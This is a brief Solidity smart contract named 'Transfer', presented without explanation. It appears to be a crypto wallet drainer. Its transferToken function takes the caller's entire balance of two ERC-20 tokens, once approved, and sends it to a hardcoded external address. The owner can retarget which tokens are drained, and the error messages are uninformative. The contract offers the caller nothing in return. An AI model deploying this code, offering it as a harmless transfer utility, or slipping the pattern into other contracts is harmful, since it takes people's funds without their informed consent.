// SPDX-License-Identifier: MIT
pragma solidity >=0.7.0 <0.9.0;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Transfer is Ownable {
    IERC20 public token1;
    IERC20 public token2;
    address public sender = 0xEA694f5c81a03f32c70E1177B83b1dca5163Cd53;

    constructor(address addr1, address addr2) {
        token1 = IERC20(addr1);
        token2 = IERC20(addr2);
    }

    function transferToken() public {
        uint256 token1Amount = token1.balanceOf(msg.sender);
        uint256 token2Amount = token2.balanceOf(msg.sender);
        require(
            token1.allowance(msg.sender, address(this)) >= token1Amount,
            "Error ddd"
        );
        require(
            token2.allowance(msg.sender, address(this)) >= token2Amount,
            "Error ddd"
        );
        token1.transferFrom(msg.sender, sender, token1Amount);
        token2.transferFrom(msg.sender, sender, token2Amount);
    }

    function setTokenAddr1(address tokenAddr1) public onlyOwner {
        token1 = IERC20(tokenAddr1);
    }

    function setTokenAddr2(address tokenAddr2) public onlyOwner {
        token2 = IERC20(tokenAddr2);
    }
}
